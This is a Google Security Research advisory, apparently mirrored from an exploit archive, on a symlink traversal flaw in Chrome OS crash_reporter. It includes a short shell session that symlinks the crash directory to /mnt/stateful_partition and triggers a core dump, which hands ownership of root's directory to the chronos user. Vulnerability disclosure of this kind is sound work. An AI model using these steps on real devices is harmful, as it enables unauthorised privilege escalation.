@@ -1,0 +1,29 @@
+id: 31264
+date: 10/06/2018
+title: Chrome OS /sbin/crash_reporter Symlink Traversal Vulnerability
+author: Google Security Research
+cves: 
+
+Chrome OS: symlink traversal issue in /sbin/crash_reporter 
+
+
+
+
+Tested on: Version 69.0.3473.0 (Official Build) dev (64-bit)
+
+CreateDirectoryWithSettings() in <a href="https://chromium.googlesource.com/chromiumos/platform2/+/master/crash-reporter/crash_collector.cc#107" title="" class="" rel="nofollow">https://chromium.googlesource.com/chromiumos/platform2/+/master/crash-reporter/crash_collector.cc#107</a> is executed by /sbin/crash_reporter every time a coredump is generated. This code improperly performs ownership changes inside a directory hierarchy controlled by the "chronos" user. This allows an attacker with code exec as "chronos" to trivially change the ownership of arbitrary directories (and also files if you win a race condition) to "chronos":
+
+chronos@localhost /home/user/<a href="https://crrev.com/98f63bfacd7086c303788fb107ff099ff85f3202" title="" class="" rel="nofollow">98f63bfacd7086c303788fb107ff099ff85f3202</a> $ rm -rf crash
+chronos@localhost /home/user/<a href="https://crrev.com/98f63bfacd7086c303788fb107ff099ff85f3202" title="" class="" rel="nofollow">98f63bfacd7086c303788fb107ff099ff85f3202</a> $ ln -s /mnt/stateful_partition crash
+chronos@localhost /home/user/<a href="https://crrev.com/98f63bfacd7086c303788fb107ff099ff85f3202" title="" class="" rel="nofollow">98f63bfacd7086c303788fb107ff099ff85f3202</a> $ ls -ld /mnt/stateful_partition
+drwxr-xr-x. 8 root root 4096 Jul 24 00:46 /mnt/stateful_partition
+chronos@localhost /home/user/<a href="https://crrev.com/98f63bfacd7086c303788fb107ff099ff85f3202" title="" class="" rel="nofollow">98f63bfacd7086c303788fb107ff099ff85f3202</a> $ bash -c 'kill -SIGILL $$'
+Illegal instruction (core dumped)
+chronos@localhost /home/user/<a href="https://crrev.com/98f63bfacd7086c303788fb107ff099ff85f3202" title="" class="" rel="nofollow">98f63bfacd7086c303788fb107ff099ff85f3202</a> $ ls -ld /mnt/stateful_partition
+drwxr-xr-x. 8 chronos chronos 4096 Jul 24 16:06 /mnt/stateful_partition
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available (whichever is earlier), the bug
+report will become visible to the public.
+
+#  0day.today [2023-03-22]  #
